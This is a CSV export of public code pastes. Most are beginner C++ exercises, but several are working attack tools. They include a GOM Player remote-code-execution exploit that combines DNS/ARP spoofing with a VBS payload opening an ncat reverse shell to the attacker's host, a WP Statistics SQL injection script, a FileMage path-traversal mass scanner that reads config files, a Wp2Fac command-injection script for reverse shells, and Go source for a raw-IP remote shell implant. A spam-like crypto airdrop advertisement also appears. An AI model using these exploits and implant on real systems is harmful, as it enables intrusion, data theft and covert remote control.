id,title,username,language,date,content
0yZ6W49E,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 06:01:57 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int a, b, c;
    cin >> a;
    cin >> b;
    cin >> c;
    
    if(a <= b and a <= c) {
        cout << a << endl;
        if(b <= c) {
            cout << b << endl;
            cout << c << endl;
        }
        else {
            cout << c << endl;
            cout << b << endl;
        }
    }
    else if(b <= a and b <= c) {
        cout << b << endl;
        if(a <= c) {
            cout << a << endl;
            cout << c << endl;
        }
        else {
            cout << c << endl;
            cout << a << endl;
        }
    }
    else {
        cout << c << endl;
        if(a <= b) {
            cout << a << endl;
            cout << b << endl;
        }
        else {
            cout << b << endl;
            cout << a << endl;
        }
    }
    return 0;
}
"
wTpcw2Lp,data817,TestGuy1,JSON,Saturday 20th of January 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9f0d841f681df7e49e42a6d21049e5c95a156da36ee204038c9a92f9913d5930a6f9cd4247200c039223d637f6f2c8a3e3ab5b19afe5a19a2cbf3b62b1bfe51fe7a60c91c6d688b37bcc69664eabc643985a647bfb98e5df6a23bd104727522ab8de7de426f21b42b518a918c397322b69f89e3c0c3e20fd0a79c71c13efd5bc',
  otherdata: [
    'c9ed17ff638bd5abdf0ffdb66f2b87a5',
    '1fbc3562ebabf74464ca42ed7df636b2',
    'bd951c59c468200ee2c02f3aa7fb9737',
    '7a6ccf07a04ad8eaa62ae3e5b5aeadea',
    'f00be90640e072dd09cf5bf88e4b7d71',
    '9b4efa69531b43913dba46f49b444ea6',
    'e29ae2bde340e81bccad3dba7f920fdc',
    'afe3815c0e63d72132dc18c76eea4f4f'
  ]
}"
zaryw2AY,IP LookUP,ngatmuri,PHP,Saturday 20th of January 2024 05:56:15 AM CDT,"<?php 
    // persiapkan curl
    $ch = curl_init(); 

    // set url 
    curl_setopt($ch, CURLOPT_URL, ""http://dynupdate.no-ip.com/ip.php"");

    // return the transfer as a string 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 

    // $output contains the output string 
    $output = curl_exec($ch); 

    // tutup curl 
    curl_close($ch);      

    // menampilkan hasil curl
    echo $output;
?>"
Arh4yZin,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:53:38 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int x;
    cin >> x;
    
    if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    else {
        cout << ""NEPAREN"" << endl;
    }
    
    return 0;
}
"
p4pAi4Pr,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:52:10 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int a, b, c;
    cin >> a;
    cin >> b;
    cin >> c;
    
    if(a + b > c and a + c > b and b + c > a) {
        cout << ""DA"" << endl;
    }
    else {
        cout << ""NE"" << endl;
    }
    
    return 0;
}
"
5vb1vbpq,GOM Player 2.3.90.5360 - Remote Code Execution (RCE),FlyFar,Python,Saturday 20th of January 2024 05:49:44 AM CDT,"# Exploit Title: GOM Player 2.3.90.5360 - Remote Code Execution (RCE)
# Date: 26.08.2023
# Author: M. Akil Gündoğan
# Contact: https://twitter.com/akilgundogan
# Vendor Homepage: https://www.gomlab.com/gomplayer-media-player/
# Software Link: https://cdn.gomlab.com/gretech/player/GOMPLAYERGLOBALSETUP_NEW.EXE
# Version: 2.3.90.5360 
# Tested on: Windows 10 Pro x64 22H2 19045.3324
# PoC Video: https://www.youtube.com/watch?v=8d0YUpdPzp8

# Impacts: GOM player has been downloaded 63,952,102 times according to CNET. It is used by millions of people worldwide.

# Vulnerability Description: 
# The IE component in the GOM Player's interface uses an insecure HTTP connection. Since IE is vulnerable to the 
# SMB/WebDAV+ ""search-ms"" technique, we can redirect the victim to the page we created with DNS spoofing and execute code on the target.
# In addition, the URL+ZIP+VBS MoTW bypass technique was used to prevent the victim from seeing any warning in the pop-up window. 

# Full disclosure, developers should be more careful about software security.

# Exploit Usage: Run it and enter the IP address of the target. Then specify the port to listen to for the reverse shell.

# Some spaghetti and a bad code but it works :)

banner = """"""\033[38;5;196m+-----------------------------------------------------------+
|     GOM Player 2.3.90.5360 - Remote Code Execution        |
|   Test edildi, sinifta kaldi. Bu oyun hic bitmeyecek :-)  |
+-----------------------------------------------------------+\033[0m"""""" +"""""" 
\033[38;5;117m[*]- Author: M. Akil Gundogan - rootkit.com.tr\n\033[0m""""""

import time,os,zipfile,subprocess,socket,sys

print(banner)

if os.geteuid() != 0:
    print(""You need root privileges to run the exploit, please use sudo..."")
    sys.exit(1)

targetIP = input(""- Target IP address: "")
listenPort = input(""- Listening port for Reverse Shell: "")

def fCreate(fileName,fileContent): # File create func. 
    f = open(fileName,""w"")
    f.write(fileContent)
    f.close()    

gw = os.popen(""ip -4 route show default"").read().split()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((gw[2], 0))
ipaddr = s.getsockname()[0]
gateway = gw[2]
host = socket.gethostname()
print (""- My IP:"", ipaddr, "" Gateway:"", gateway, "" Host:"", host) 

print(""\n[*]- Stage 1: Downloading neccesary tools..."")

smbFolderName = ""GomUpdater"" # change this (optional)
expWorkDir = ""gomExploitDir"" # change this (optional)
os.system(""mkdir "" + expWorkDir +"" >/dev/null 2>&1 &"") # Creating a working directory for the exploit.
time.sleep(1) # It's necessary for exploit stability. 
os.system(""cd "" + expWorkDir + ""&& mkdir smb-shared web-shared >/dev/null 2>&1 &"") # Creating a working directory for the exploit.
time.sleep(1) # It's necessary for exploit stability. 
os.system(""cd "" + expWorkDir + ""/smb-shared && wget https://nmap.org/dist/ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && unzip -o -j ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && rm -rf ncat-portable-5.59BETA1.zip README"") #Downloading ncat
print(""    [*] - Ncat has been downloaded."")
subprocess.run(""git clone https://github.com/fortra/impacket.git "" + expWorkDir + ""/impacket >/dev/null 2>&1"",shell=True) # Downloading Impacket
print(""    [*] - Impacket has been downloaded."")
subprocess.run(""git clone https://github.com/dtrecherel/DNSSpoof.git "" + expWorkDir + ""/dnsspoof >/dev/null 2>&1"",shell=True) # Downloading DNSSpoof.py
print(""    [*] - DNSSpoof.py has been downloaded."")

print(""[*]- Stage 2: Creating Attacker SMB Server..."")
subprocess.Popen(""cd gomExploitDir/impacket/examples && python3 smbserver.py ""+smbFolderName+"" ../../smb-shared -smb2support >/dev/null 2>&1"",shell=True) # Running SMB server.
time.sleep(5) # It's necessary for exploit stability. 

smbIP = ipaddr
spoofUrl = ""playinfo.gomlab.com"" # Web page that causes vulnerability because it is used as HTTP

print(""[*]- Stage 3: Creating Attacker Web Page..."")

# change this (optional) 
screenExpPage = """"""
<meta charset=""utf-8"">
<script> window.alert(""GOM Player için acil güncelleme yapılmalı ! Açılan pencerede lütfen updater'a tıklayın."");</script> 
<script>window.location.href= 'search-ms:displayname=GOM Player Updater&crumb=System.Generic.String%3AUpdater&crumb=location:%5C%5C""""""+smbIP+""""""';
</script>
""""""

fCreate(expWorkDir + ""/web-shared/screen.html"",screenExpPage)
time.sleep(3) # It's necessary for exploit stability. 

print(""[*]- Stage 4: Creating URL+VBS for MoTW bypass placing it into the ZIP archive..."")
vbsCommand = '''Set shell=CreateObject(""wscript.shell"") 
Shell.Run(""xcopy /y \\\\yogurt\\ayran\\ncat.exe %temp%"")
WScript.Sleep 5000
Shell.Run(""cmd /c start /min cmd /c %temp%\\ncat.exe attackerIP attackerPort -e cmd"")''' # change this (optional)
vbsCommand = vbsCommand.replace(""yogurt"", smbIP).replace(""ayran"", smbFolderName).replace(""attackerIP"",smbIP).replace(""attackerPort"",listenPort)
fCreate(expWorkDir + ""/payload.vbs"",vbsCommand)

urlShortcut = '''[InternetShortcut]
URL=file://'''+smbIP+""/""+smbFolderName+'''/archive.zip/payload.vbs
IDlist='''
fCreate(expWorkDir + ""/smb-shared/Updater.url"",urlShortcut)
time.sleep(3) # It's necessary for exploit stability. 
zipName = expWorkDir + ""/smb-shared/archive.zip""
payload_filename = os.path.join(expWorkDir, ""payload.vbs"")  

with zipfile.ZipFile(zipName, ""w"") as malzip:
    malzip.write(payload_filename, arcname=os.path.basename(payload_filename))

print(""[*]- Stage 5: Running the attacker's web server..."")
subprocess.Popen(""cd "" + expWorkDir + ""/web-shared && python3 -m http.server 80 >/dev/null 2>&1"",shell=True) # Running attacker web server with Python mini http.server
time.sleep(3) # It's necessary for exploit stability. 

print(""[*]- Stage 6: Performing DNS and ARP spoofing for the target..."")
subprocess.Popen(""python3 "" + expWorkDir + ""/dnsspoof/dnsspoof.py -d "" + spoofUrl + "" -t "" + targetIP + "">/dev/null 2>&1"",shell=True) # DNS Spoofing...
time.sleep(10) # It's neccesary for exploit stability.
os.system(""ping -c 5 "" + targetIP + "" >/dev/null 2>&1 &"") # Ping the target... 
os.system(""arping -c 5 "" + targetIP + "" >/dev/null 2>&1 &"") # ARPing the target.
print(""[*]- Stage 7: Waiting for the target to open GOM Player and execute the malicious URL shortcut...\n"")
subprocess.run(""nc -lvnp "" + listenPort,shell=True)
subprocess.run(""pkill -f smbserver.py & pkill -f http.server & pkill -f dnsspoof.py"",shell=True) # Closing background processes after exploitation...
            "
MyERBEg5,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:49:19 AM CDT,"#include <iostream>
using namespace std;

int main() {
   
    int mesec;
    cin >> mesec;
    
    if(mesec == 2) {
        cout << 28 << endl;
    }
    else if(mesec == 1 or mesec == 3 or mesec == 5 or mesec == 7 or mesec == 8 or mesec == 10 or mesec == 12) {
        cout << 31 << endl;
    }
    else {
        cout << 30 << endl;
    }
    
    
    return 0;
}
"
s3M9uP8n,WP Statistics Plugin 13.1.5 current_page_id - Time based SQL injection - CVE-2022-25148,FlyFar,Python,Saturday 20th of January 2024 05:47:31 AM CDT,"# Exploit Title: WP Statistics Plugin <= 13.1.5 current_page_id - Time based SQL injection (Unauthenticated)
# Date: 13/02/2022
# Exploit Author: psychoSherlock
# Vendor Homepage: https://wp-statistics.com/
# Software Link: https://downloads.wordpress.org/plugin/wp-statistics.13.1.5.zip
# Version: 13.1.5 and prior
# Tested on: wp-statistics 13.1.5
# CVE : CVE-2022-25148
# Vendor URL: https://wordpress.org/plugins/wp-statistics/
# CVSS Score: 8.4 (High)

import argparse
import requests
import re
import urllib.parse


def main():
    parser = argparse.ArgumentParser(description=""CVE-2022-25148"")
    parser.add_argument('-u', '--url', required=True,
                        help='Wordpress base URL')

    args = parser.parse_args()

    baseUrl = args.url
    payload = ""IF(1=1, sleep(5), 1)""

    wp_session = requests.session()

    resp = wp_session.get(baseUrl)
    nonce = re.search(r'_wpnonce=(.*?)&wp_statistics_hit', resp.text).group(1)
    print(f""Gathered Nonce: {nonce}"")

    headers = {
        ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15""}

    payload = urllib.parse.quote_plus(payload)
    exploit = f'/wp-json/wp-statistics/v2/hit?_=11&_wpnonce={nonce}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id={payload}&search_query&page_uri=/&user_id=0'
    exploit_url = baseUrl + exploit

    print(f'\nSending: {exploit_url}')

    resp = wp_session.get(exploit_url, headers=headers)

    if float(resp.elapsed.total_seconds()) >= 5.0:
        print(""\n!!! Target is vulnerable !!!"")
        print(f'\nTime taken: {resp.elapsed.total_seconds()}')
    else:
        print('Target is not vulnerable')


if __name__ == ""__main__"":
    main()
            "
CRqznmDr,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:47:13 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int x;
    cin >> x;
    
    
    if(x < 10) {
        cout << ""pomalo od 10"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""paren"" << endl;
    }
    else {
        cout << ""nisto od ova ne e tocno"" << endl;
    }
    
    
    
    return 0;
}
"
1FZjHM4X,sh_par_test.sh,FranzVuttke,Bash,Saturday 20th of January 2024 05:46:38 AM CDT,"#!/bin/bash
echo $#
echo ${#3}

"
A0rj6pkS,FileMage Gateway 1.10.9 - Local File Inclusion - CVE-2023-39026,FlyFar,Python,Saturday 20th of January 2024 05:45:36 AM CDT,"# Exploit Title: FileMage Gateway 1.10.9 - Local File Inclusion
# Date: 8/22/2023
# Exploit Author: Bryce ""Raindayzz"" Harty   
# Vendor Homepage: https://www.filemage.io/
# Version: Azure Versions < 1.10.9
# Tested on: All Azure deployments < 1.10.9 
# CVE : CVE-2023-39026

# Technical Blog - https://raindayzz.com/technicalblog/2023/08/20/FileMage-Vulnerability.html
# Patch from vendor - https://www.filemage.io/docs/updates.html

import requests
import warnings
warnings.filterwarnings(""ignore"")
def worker(url):
    response = requests.get(url, verify=False, timeout=.5)
    return response
def main():
    listIP = []
    file_path = input(""Enter the path to the file containing the IP addresses: "")
    with open(file_path, 'r') as file:
        ip_list = file.read().splitlines()
        searchString = ""tls""
        for ip in ip_list:
            url = f""https://{ip}"" + ""/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml""
            try:
                response = worker(url)
                #print(response.text)
                if searchString in response.text:
                    print(""Vulnerable IP: "" + ip)
                    print(response.text)
                    listIP.append(ip)
            except requests.exceptions.RequestException as e:  
                print(f""Error occurred for {ip}: {str(e)}"")

    for x in listIP:
        print(x)
if __name__ == '__main__':
    main()
            "
LYHwrmsX,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Saturday 20th of January 2024 05:44:54 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

422668"
rSmw0qqT,mnt_other_distro.sh,FranzVuttke,Bash,Saturday 20th of January 2024 05:43:50 AM CDT,"#!/bin/bash

#
# created by OuNiS 01.2024
# doc: https://www.facebook.com/groups/linux.fans.group/posts/24685486807733102/?__cft__[0]=AZUTsgKEF5DlRDSGTYGu6kjYsJdS1Lm090Z2B_T9TvBJ7bon4XQSI6fhNqqZByoGYbtProsYei1SNUQ_Mgl2PuKyDlDXbVRRc4wDqGnNXk6jZEDPaw1qTSQ7O6f3MdhzBqpMYbPNebHreHdqHXotmcN-&__tn__=%2CO%2CP-R
#
sudo mkdir /mnt/distro
sudo mount /dev/sda2 /mnt/distro


"
HgYSx4ib,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:42:56 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int x;
    cin >> x;
    
    if(x < 10) {
        cout << ""Pomal od 10"" << endl;
    }
    else if(x > 10) {
        cout << ""Pogolemo od 10"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    
    
    if(x % 2 == 1) {
        cout << ""NEPAREN"" << endl;
    }
    else if(x % 2 == 0) {
        cout << ""PAREN"" << endl;
    }
    
    
    
    return 0;
}
"
cvR02C9H,Wp2Fac - OS Command Injection,FlyFar,Python,Saturday 20th of January 2024 05:41:02 AM CDT,"# Exploit Title: Wp2Fac v1.0 - OS Command Injection
# Date: 2023-08-27
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor: https://github.com/metinyesil/wp2fac
# Tested on: Kali Linux & Windows 11
# CVE: N/A

import requests

def send_post_request(host, revshell):
    url = f'http://{host}/send.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0)
Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f'http://{host}',
        'Connection': 'close',
        'Referer': f'http://{host}/',
    }

    data = {
        'numara': f'1234567890 & {revshell} &;'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.text

host = input(""Target IP: "")

revshell = input(""Reverse Shell Command: "")

print(""Check your listener!"")

send_post_request(host, revshell)
            "
2XZRnMTt,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:35:54 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b;
    cin >> a >> b;
    
    if(a > b and a % 2 == 0) {
        cout << ""DA"" << endl;
    }
    
    return 0;
}
"
GEKh59Rk,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:30:06 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int mesec;
    cin >> mesec;
    
    if(mesec == 2) {
        cout << 28 << endl;
    }
    
    if(mesec == 1 or mesec == 3 or mesec == 5 or mesec == 7 or mesec == 8 or mesec == 10 or mesec == 12) {
        cout << 31 << endl;
    }
    if(mesec == 4 or mesec == 6 or mesec == 9 or mesec == 11) {
        cout << 30 << endl;
    }
    
    return 0;
}
"
0brLthRD,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 05:27:10 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b;
    cin >> a;
    cin >> b;
    
    if(a > b or b % 2 == 1) {
        cout << ""DA"" << endl;
    }
    
    
    return 0;
}
"
2P4u5ppD,Untitled,35657,C++,Saturday 20th of January 2024 05:25:13 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;

void InsertChar(char* str, char ch, int num) {
	num--;
	for (int i = strlen(str) + 1; i > num; i--) {
		str[i] = str[i - 1];
	}
	str[num] = ch;
}

int main() {

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	char ch;
	int num;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите символ: "";
	cin >> ch;
	cout << ""Введите позиция: "";
	cin >> num;
	InsertChar(line, ch, num);
	cout << line << endl;
	
}"
FRqc55Hs,shell.go,FlyFar,Go,Saturday 20th of January 2024 05:24:42 AM CDT,"package main

/*
 * shell.go
 * Hook up the network to a shell
 * By J. Stuart McMurray
 * Created 0160226
 * Last Modified 0160226
 */

import (
	""bufio""
	""io""
	""log""
	""net""
	""os""
	""os/exec""
	""runtime""
)

func shell(c *net.IPConn, name string) {
	/* Get keys */
	skey, rkey := readShellKeys()
	for {
		/* Get a shell */
		shell, stdin, stdout, stderr := makeShell(name)
		/* Start the copies */
		ec := make(chan error, 4)
		go send(c, stdout, skey, ec)
		go send(c, stderr, skey, ec)
		go recv(stdin, c, rkey, ec)
		/* Start the shell */
		if err := shell.Start(); nil != err {
			log.Fatalf(""Cannot start shell: %v"", err)
		}
		log.Printf(""Ready %v <-> %v"", c.LocalAddr(), c.RemoteAddr())
		go func() {
			ec <- shell.Wait()
		}()

		/* Wait for something to happen */
		err := <-ec
		shell.Process.Kill()
		stdin.Close()
		stdout.Close()
		stderr.Close()
		if nil != err && io.EOF != err {
			log.Printf(""Error: %v"", err)
		} else {
			log.Printf(""Done."")
		}
	}
}

/* makeShell makes a shell named n, and returns the shell and it's i/o. */
func makeShell(n string) (
	shell *exec.Cmd,
	stdin io.WriteCloser,
	stdout io.ReadCloser,
	stderr io.ReadCloser,
) {
	if ""windows"" == runtime.GOOS {
		log.Fatalf(""Windows is not supported.  Please submit a patch."")
	}
	/* Make a shell */
	shell = exec.Command(""/bin/sh"")
	/* Set the binary as /bin/sh */
	shell.Path = ""/bin/sh""
	/* Name it something shady */
	shell.Args = []string{n}
	/* Get i/o */
	stdin, stdout, stderr = pipes(shell)
	return
}

/* pipes gets the i/o pipes for c, or calls log.Fatalf if it can't */
func pipes(cmd *exec.Cmd) (stdin io.WriteCloser, stdout, stderr io.ReadCloser) {
	var err error
	/* Get stdio */
	stdin, err = cmd.StdinPipe()
	if nil != err {
		log.Fatalf(""Cannot get stdin: %v"", err)
	}
	stdout, err = cmd.StdoutPipe()
	if nil != err {
		log.Fatalf(""Cannot get stdout: %v"", err)
	}
	stderr, err = cmd.StderrPipe()
	if nil != err {
		log.Fatalf(""Cannot get stderr: %v"", err)
	}
	return
}

/* readShellKeys gets two keys (send, receive) from stdin. */
func readShellKeys() (skey, rkey [KEYLEN]byte) {
	r := bufio.NewReader(os.Stdin)
	skey = getKey(r)
	rkey = getKey(r)
	return
}"
LL85isU9,sender.go,FlyFar,Go,Saturday 20th of January 2024 05:24:05 AM CDT,"package main

/*
 * sender.go
 * Send encrypted data to the network
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""crypto/rand""
	""io""
	""log""
	""net""

	""golang.org/x/crypto/nacl/secretbox""
)

/* send sends messages from in to out, encrypting them with the key.  If there
is an error, it will be sent to ec. */
func send(out *net.IPConn, in io.Reader, key [KEYLEN]byte, ec chan<- error) {
	if err := xmit(out, in, key, roll); nil != err {
		ec <- err
	}
	ec <- nil
}

/* roll encrypts a message, and prepends the nonce, puts it in buf, and
returns buf. */
func roll(buf, msg []byte, key [KEYLEN]byte) ([]byte, error) {
	/* Reset buffer */
	buf = buf[0:0]
	/* Get a nonce */
	n := nonce()
	/* Put it at the beginning of the message to send */
	for _, v := range n {
		buf = append(buf, v)
	}
	/* Encrypt the message */
	return secretbox.Seal(buf, msg, &n, &key), nil
}

/* nonce returns a nonce.  The nonce returned will be different for each call
to nonce. */
func nonce() [NONCELEN]byte {
	snoncebuf := make([]byte, NONCELEN)
	var n [NONCELEN]byte
	/* Read random bytes */
	_, err := rand.Read(snoncebuf)
	if nil != err {
		log.Fatalf(""Rand read: %v"", err)
	}
	/* Populate into an array */
	for i, v := range snoncebuf {
		n[i] = v
	}
	return n
}"
Lrryywpy,receiver.go,FlyFar,Go,Saturday 20th of January 2024 05:23:32 AM CDT,"package main

/*
 * receiver.go
 * Receive data from the network, unpack/unencrypt it
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""fmt""
	""io""
	""net""

	""golang.org/x/crypto/nacl/secretbox""
)

const (
	IP4HLEN = 20 /* IPv4 Header Length */
	IP6HLEN = 40 /* IPv6 Header Length */
)

/* recv receives packets from in, decrypts them, and sends to out.  If there
is an error, it will be sent to ec. */
func recv(out io.Writer, in *net.IPConn, key [KEYLEN]byte, ec chan<- error) {
	if err := xmit(out, in, key, unroll); nil != err {
		ec <- err
	}
	ec <- nil
}

/* unroll takes the packet in msg, chops off the IP header, decrypts the
packet, puts the plaintext in buf, and returns buf.  Non-fatal errors will
cause a log message to be printed, but no error will be returned. */
func unroll(buf, msg []byte, key [KEYLEN]byte) ([]byte, error) {
	buf = buf[0:0]
	/* Get the nonce and ciphertext */
	nonce, msg, err := splitPacket(msg)
	if nil != err {
		return buf, err
	}
	ok := false
	buf, ok = secretbox.Open(buf, msg, &nonce, &key)
	if !ok {
		return buf, fmt.Errorf(""decrypt failed"")
	}
	return buf, nil
}

/* splitPacket returns the nonce and payload from a packet. */
func splitPacket(msg []byte) (
	nonce [NONCELEN]byte,
	payload []byte,
	err error,
) {
	/* Remove the header */
	msg, err = chopHeader(msg)
	if nil != err {
		return nonce, msg, err
	}

	/* If there's no bytes left, it's probably a heartbeet */
	if 0 == len(msg) {
		return nonce, msg, HeartBeetError
	}

	/* Pull off the nonce */
	if NONCELEN > len(msg) {
		return nonce, msg, fmt.Errorf(
			""packet body too small for nonce: %02X"",
			msg,
		)
	}
	for i, _ := range nonce {
		nonce[i] = msg[i]
	}

	/* The rest is the payload */
	payload = msg[NONCELEN:]

	return nonce, payload, err
}

/* chopHeader reslices pkt to remove the IP header. */
func chopHeader(pkt []byte) ([]byte, error) {
	/* Switch by IP version */
	switch (pkt[0] & 0xF0) >> 4 {
	case 4:
		if IP4HLEN > len(pkt) {
			return pkt, fmt.Errorf(
				""message too small (<%v bytes)"",
				IP4HLEN,
			)
		}
		pkt = pkt[IP4HLEN:]
	case 6:
		if IP6HLEN > len(pkt) {
			return pkt, fmt.Errorf(
				""message too small (<%v bytes)"",
				IP6HLEN,
			)
		}
		pkt = pkt[IP6HLEN:]
	default:
		return pkt, fmt.Errorf(
			""unknown IP version: %02X"",
			pkt,
		)
	}
	return pkt, nil
}"
HkSL5ii7,net.go,FlyFar,Go,Saturday 20th of January 2024 05:22:55 AM CDT,"package main

/*
 * net.go
 * Network functions
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

import (
	""fmt""
	""io""
	""log""
	""net""
	""time""
)

var HeartBeetError = fmt.Errorf(""heartbeet"")

/* localIP gets a local IP address for the host, or 127.0.0.1 if nothing else
works */
func localIP() (string, error) {
	/* Local addresses */
	addrs, err := net.InterfaceAddrs()
	if nil != err {
		return ""127.0.0.1"", err
	}
	/* Find the first non-loopback address */
	for _, v := range addrs {
		/* Cast to something we can use */
		i, ok := v.(*net.IPNet)
		if !ok {
			log.Printf(""Found strange address: %v"", v)
			continue
		}
		/* Only get external addresses */
		if !i.IP.IsGlobalUnicast() {
			continue
		}
		return i.IP.String(), nil
	}
	return ""127.0.0.1"", nil
}

/* resolve resolves addresses to addresses or dies */
func resolve(a string) *net.IPAddr {
	i, err := net.ResolveIPAddr(""ip"", a)
	if nil != err {
		log.Fatalf(""Resolve: %v"", err)
	}
	return i
}

/* xmit copies bytes from in to out, passing them through crypt in the process.
If there is an error, it will be sent to ec. */
func xmit(
	out io.Writer,
	in io.Reader,
	key [KEYLEN]byte,
	crypt func(buf, msg []byte, key [KEYLEN]byte) ([]byte, error),
) error {
	var (
		pbuf = make([]byte, BUFLEN) /* Plaintext Buffer */
		cbuf = make([]byte, BUFLEN) /* Ciphertext buffer */
		rerr error                  /* Read error */
		werr error                  /* Write error */
		cerr error                  /* Encryption error */
		n    int                    /* Read length */
	)
	for {
		/* Reset buffer */
		pbuf = pbuf[0:cap(pbuf)]

		/* Read a bit */
		n, rerr = in.Read(pbuf)
		/* Trim unused space */
		pbuf = pbuf[:n]

		/* If we didn't read anything, try again if there's no error */
		if 0 == n {
			/* If there's an error, give up */
			if nil != rerr {
				return rerr
			}
			log.Printf(""Heartbeet?"") /* DEBUG */
		}

		/* Crypt and send the message */
		cbuf, cerr = crypt(cbuf, pbuf, key)
		if nil != cerr {
			if HeartBeetError != cerr {
				log.Printf(""Crypt: %v"", cerr)
			}
			continue
		}
		_, werr = out.Write(cbuf)

		/* If either read or write errored, give up */
		if nil != rerr {
			return rerr
		}
		if nil != werr {
			return werr
		}
	}
}

/* heartbeet sends 0-byte messages on c at roughly the given interval, as
keepalives */
func heartbeet(c net.Conn, interval time.Duration) {
	for {
		if _, err := c.Write([]byte{}); nil != err {
			log.Fatalf(""Heartbeet: %v"", err)
		}
		time.Sleep(interval)
	}
}

/* connect ""connects"" to the other side */
func connect(
	laddr string,
	raddr string,
	proto uint,
	hbint time.Duration,
) *net.IPConn {
	c, err := net.DialIP(
		fmt.Sprintf(""ip:%v"", proto),
		resolve(laddr),
		resolve(raddr),
	)
	if nil != err {
		log.Fatalf(""Dial: %v"", err)
	}

	/* Start to heartbeet */
	go heartbeet(c, hbint)

	return c
}"
qKVHbaFB,ip74.go,FlyFar,Go,Saturday 20th of January 2024 05:22:18 AM CDT,"package main

import (
	""bufio""
	""bytes""
	""flag""
	""fmt""
	""log""
	""os""
	""time""
)

/*
 * ip74.go
 * Program to send and receive comms over raw IP
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

const (
	HBINT    = time.Minute    /* Default heartbeet interval */
	NAME     = ""zzzzzzziprat"" /* Name for child process */
	REMOTE   = ""127.0.0.1""    /* Default remote address */
	BUFLEN   = 65511          /* Copy buffer size */
	PROTO    = 74             /* Default IP protocol */
	KEYLEN   = 32             /* Key length */
	NONCELEN = 24             /* Nonce length, must be < BUFLEN */
)

/* Make sure BUFLEN and NONCELEN work */
func init() {
	if BUFLEN <= NONCELEN ||
		(BUFLEN+NONCELEN) > 65535 {
		panic(""Invalid buffer sizes"")
	}
}

func main() {
	/* Get the local address */
	loc, err := localIP()
	if nil != err {
		log.Printf(""Unable to determine local address: %v"", err)
	}
	var (
		laddr = flag.String(
			""l"",
			loc,
			""Local `address`"",
		)
		raddr = flag.String(
			""r"",
			REMOTE,
			""Remote `address`"",
		)
		proto = flag.Uint(
			""p"",
			PROTO,
			""IP protocol `number`"",
		)
		attacker = flag.Bool(
			""s"",
			false,
			""Don't spawn a shell, use stdio instead ""+
				""(set on attacker side)"",
		)
		name = flag.String(
			""n"",
			NAME,
			""Process `name` for child (ignored if -s is set)"",
		)
		hbint = flag.Duration(
			""i"",
			HBINT,
			""Heartbeet `interval`"",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]
	
Sends and receives ip packets between the remote and local hosts and either
proxies the data to a shell or stdio.

Two newline-terminated 32-byte keys expected on stdin.  The first is for
decrypting data read from the network, and the second is to encrypt data to be
sent on the network.

If -s is given, instead of connecting a shell to the network, it connects stdio
to the network.  Use on the attacker side.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Set up networking */
	c := connect(*laddr, *raddr, *proto, *hbint)

	/* Be comms or a rat */
	if *attacker {
		attack(c)
	} else {
		shell(c, *name)
	}
	log.Printf(""Done."")

}

/* getKey gets a key from stdin, or dies if it's the wrong length. */
func getKey(r *bufio.Reader) [KEYLEN]byte {
	var a [KEYLEN]byte
	/* Read the key */
	l, err := r.ReadBytes('\n')
	if nil != err {
